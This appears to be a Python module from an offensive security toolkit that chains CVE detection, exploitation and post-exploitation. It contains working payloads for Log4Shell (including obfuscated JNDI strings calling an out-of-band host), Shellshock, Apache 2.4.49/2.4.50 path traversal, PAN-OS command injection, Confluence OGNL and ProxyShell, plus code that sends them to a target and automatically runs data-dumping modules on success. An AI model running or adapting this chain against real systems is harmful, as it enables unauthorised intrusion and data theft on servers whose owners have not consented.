# core/cve_chain.py — CVE chain: detect -> exploit -> post-exploit
import time
from core.http import HttpClient
from core.cve_db import load_edb


EXPLOIT_POCS = {
    # ============ Web servers ============
    "CVE-2021-41773": {
        "name": "Apache 2.4.49 Path Traversal -> RCE",
        "type": "path_traversal",
        "paths": [
            "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
            "/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd",
            "/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        ],
        "markers": ["root:x:0:0", "daemon:x:"],
        "post_exploit": ["lfi_dump"],
    },
    "CVE-2021-42013": {
        "name": "Apache 2.4.50 Path Traversal (bypass)",
        "type": "path_traversal",
        "paths": [
            "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
        ],
        "markers": ["root:x:0:0"],
        "post_exploit": ["lfi_dump"],
    },
    "CVE-2017-5638": {
        "name": "Apache Struts2 S2-045 Content-Type RCE",
        "type": "header_injection",
        "headers": ["Content-Type"],
        "post_exploit": ["rce_dump"],
    },
    "CVE-2021-44228": {
        "name": "Log4Shell JNDI RCE",
        "type": "jndi_injection",
        "headers": ["User-Agent", "X-Forwarded-For", "Referer", "X-Api-Version",
                    "X-Client-IP", "X-Originating-IP", "Accept-Language", "Cookie"],
        "payloads": [
            "${jndi:ldap://OOB_HOST/a}",
            "${jndi:dns://OOB_HOST/a}",
            "${jndi:rmi://OOB_HOST/a}",
            "${${lower:j}ndi:ldap://OOB_HOST/a}",
            "${${upper:j}ndi:ldap://OOB_HOST/a}",
            "${${::-j}${::-n}${::-d}${::-i}:ldap://OOB_HOST/a}",
            "${jndi:ldap://OOB_HOST/${hostName}}",
            "${jndi:ldap://OOB_HOST/${sys:java.version}}",
        ],
        "post_exploit": ["rce_dump"],
    },
    "CVE-2022-22965": {
        "name": "Spring4Shell RCE",
        "type": "spring_rce",
        "paths": ["/", "/api", "/login", "/search"],
        "post_exploit": ["rce_dump"],
    },
    "CVE-2019-8942": {
        "name": "WordPress 4.9-5.0 RCE",
        "type": "wordpress_rce",
        "paths": ["/wp-admin/", "/wp-content/uploads/"],
        "post_exploit": ["lfi_dump"],
    },
    "CVE-2020-25213": {
        "name": "WordPress File Manager RCE",
        "type": "file_upload",
        "paths": ["/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"],
        "post_exploit": ["rce_dump"],
    },
    "CVE-2024-3400": {
        "name": "PAN-OS GlobalProtect Command Injection",
        "type": "header_injection",
        "paths": ["/ssl-vpn/hipreport.esp"],
        "headers": ["Cookie"],
        "payloads": [
            'SESSID=./../../../opt/panlogs/tmp/device_telemetry/minute/`id`',
        ],
        "post_exploit": ["rce_dump"],
    },
    "CVE-2021-34473": {
        "name": "ProxyShell Exchange RCE",
        "type": "path_traversal",
        "paths": [
            "/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@foo.com",
            "/autodiscover/autodiscover.json?/mapi/emsmdb/?&Email=autodiscover/autodiscover.json%3f@foo.com",
        ],
        "markers": ["powershell", "Exchange"],
        "post_exploit": ["rce_dump"],
    },
    "CVE-2021-26855": {
        "name": "ProxyLogon SSRF",
        "type": "ssrf",
        "paths": ["/ecp/x.js"],
        "headers": {"Cookie": "X-BEResource=localhost~1942062522"},
        "post_exploit": [],
    },
}


EXPLOIT_POCS.update({
    "CVE-2022-26134": {
        "name": "Confluence OGNL Injection RCE",
        "type": "ognl_injection",
        "payloads": [
            "%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%27X-Cmd-Response%27%2C%23a%29%29%7D/",
        ],
        "headers_response": ["X-Cmd-Response"],
        "post_exploit": ["rce_dump"],
    },
    "CVE-2023-22527": {
        "name": "Confluence Template Injection RCE",
        "type": "template_injection",
        "paths": ["/template/aui/text-inline.vm"],
        "post_exploit": ["rce_dump"],
    },
    "CVE-2019-1003000": {
        "name": "Jenkins Script Security Bypass",
        "type": "groovy_sandbox_bypass",
        "paths": ["/script", "/scriptText"],
        "post_exploit": ["rce_dump"],
    },
    "CVE-2024-23897": {
        "name": "Jenkins CLI Arbitrary File Read",
        "type": "file_read",
        "paths": ["/cli"],
        "post_exploit": ["lfi_dump"],
    },
    "CVE-2014-6271": {
        "name": "Shellshock Bash RCE",
        "type": "header_injection",
        "headers": ["User-Agent", "Referer", "Cookie"],
        "payloads": [
            "() { :; }; echo Content-Type: text/plain; echo; /bin/bash -c 'id'",
        ],
        "paths": ["/cgi-bin/test.cgi", "/cgi-bin/printenv"],
        "markers": ["uid=", "gid="],
        "post_exploit": ["rce_dump"],
    },
    "CVE-2020-1472": {
        "name": "Zerologon Netlogon Privilege Escalation",
        "type": "netlogon",
        "port": 445,
        "post_exploit": [],
    },
    "CVE-2023-3519": {
        "name": "Citrix NetScaler RCE",
        "type": "path_traversal",
        "paths": ["/gwtest/formssso?event=start"],
        "post_exploit": ["rce_dump"],
    },
    "CVE-2023-4966": {
        "name": "Citrix Bleed Session Token Leak",
        "type": "header_injection",
        "paths": ["/oauth/idp/.well-known/openid-configuration"],
        "post_exploit": [],
    },
    "CVE-2021-22205": {
        "name": "GitLab ExifTool RCE",
        "type": "file_upload",
        "paths": ["/uploads/user"],
        "post_exploit": ["rce_dump"],
    },
    "CVE-2023-7028": {
        "name": "GitLab Account Takeover via Email",
        "type": "auth_bypass",
        "paths": ["/users/password/new"],
        "post_exploit": ["lfi_dump"],
    },
})


EXPLOIT_POCS.update({
    "CVE-2018-1002105": {
        "name": "Kubernetes API Server PrivEsc",
        "type": "api_exploit",
        "paths": ["/api/v1/namespaces/kube-system/pods"],
        "port": 6443,
        "post_exploit": ["rce_dump"],
    },
    "CVE-2019-5736": {
        "name": "runc Container Escape",
        "type": "container_escape",
        "post_exploit": ["rce_dump"],
    },
    "CVE-2024-3094": {
        "name": "xz-utils Backdoor (supply chain)",
        "type": "supply_chain",
        "note": "Check liblzma version 5.6.0/5.6.1",
        "post_exploit": [],
    },
    "CVE-2024-47575": {
        "name": "FortiManager Auth Bypass -> RCE",
        "type": "auth_bypass",
        "port": 541,
        "post_exploit": ["rce_dump"],
    },
    "CVE-2022-42475": {
        "name": "FortiOS SSL-VPN Heap Overflow",
        "type": "heap_overflow",
        "paths": ["/remote/login"],
        "post_exploit": [],
    },
    "CVE-2023-34362": {
        "name": "MOVEit Transfer SQLi -> RCE",
        "type": "sql_injection",
        "paths": ["/human.aspx", "/moveitisapi/moveitisapi.dll"],
        "post_exploit": ["sqli_dump", "rce_dump"],
    },
})


class CveChain:
    def run(self, session, logger, cve_id=None):
        target = session.target
        http = HttpClient(session, logger)

        if not cve_id:
            import re
            for f in session.findings:
                if f.get("kind") == "cve_match":
                    m = re.search(r"CVE-\d{4}-\d+", f.get("detail", ""))
                    if m:
                        cve_id = m.group(0)
                        break

        if not cve_id:
            print("[cve_chain] no CVE specified")
            return {}

        print(f"[cve_chain] target: {target}")
        print(f"[cve_chain] CVE: {cve_id}")

        edb = load_edb()
        exploits = edb.get(cve_id, [])
        poc = EXPLOIT_POCS.get(cve_id)

        if exploits:
            print(f"  ExploitDB: {len(exploits)} entries")
            for e in exploits[:2]:
                print(f"    EDB-{e['edb_id']}: {e['title'][:80]}")

        if not poc:
            print(f"  no built-in PoC for {cve_id}")
            return {"cve": cve_id, "exploits": exploits}

        print(f"\n[cve_chain] running {poc['type']} PoC: {poc['name']}")
        results = []

        if poc["type"] == "path_traversal":
            for path in poc.get("paths", []):
                url = target.rstrip("/") + path
                r = http.get(url)
                if not r:
                    continue
                for marker in poc.get("markers", []):
                    if marker in r.text:
                        print(f"  ✓ VULNERABLE: {path} -> {marker}")
                        logger.finding("cve_exploit_success", "critical",
                                       f"{cve_id} {path}")
                        results.append({"path": path, "marker": marker})

        elif poc["type"] == "jndi_injection":
            import os
            oob = os.environ.get("OOB_HOST", "oob.example")
            for header in poc.get("headers", [])[:5]:
                p = poc["payloads"][0].replace("OOB_HOST", oob)
                r = http.get(target, headers={header: p})
                print(f"  probe {header} sent to {oob}")
            results.append({"type": "jndi_sent", "oob": oob})
            logger.finding("cve_probe_sent", "high", f"{cve_id} JNDI probes")

        elif poc["type"] in ("header_injection", "ssrf"):
            for header in poc.get("headers", []):
                hdrs = poc.get("headers") if isinstance(poc.get("headers"), dict) else {header: poc.get("payloads", [""])[0]}
                r = http.get(target, headers=hdrs if isinstance(hdrs, dict) else None)
                print(f"  probe header {header}: {r.status_code if r else 'no response'}")
                results.append({"header": header})

        else:
            for path in poc.get("paths", []):
                url = target.rstrip("/") + path
                r = http.get(url)
                if r:
                    print(f"  probe {path}: {r.status_code}")
                    results.append({"path": path, "code": r.status_code})

        # post-exploit
        if poc.get("post_exploit") and results:
            print(f"\n[cve_chain] post-exploit: {poc['post_exploit']}")
            from core.loader import ModuleLoader
            loader = ModuleLoader()
            for mod in poc["post_exploit"]:
                try:
                    m = loader.load("dump", mod)
                    if m:
                        print(f"  running {mod}")
                        m.run(session, logger)
                except Exception as e:
                    print(f"  skip {mod}: {type(e).__name__}")

        print(f"\n[cve_chain] done. results: {len(results)}")
        return {"cve": cve_id, "results": results, "poc": poc}


def run_chain_for_cve(session, logger, cve_id):
    cc = CveChain()
    return cc.run(session, logger, cve_id)
